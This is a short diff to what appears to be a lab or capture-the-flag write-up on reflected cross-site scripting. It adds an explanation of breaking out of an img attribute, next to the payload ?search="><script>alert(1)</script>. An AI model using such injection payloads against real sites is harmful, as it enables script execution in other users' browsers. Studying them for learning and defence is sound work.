@@ -28,6 +28,8 @@ if(query) {
 
 Then I Craft The Payload and We Got POP Up !!
 
+Break out of the `img` attribute by searching for:
+
 ```
 ?search="><script>alert(1)</script>
 ```
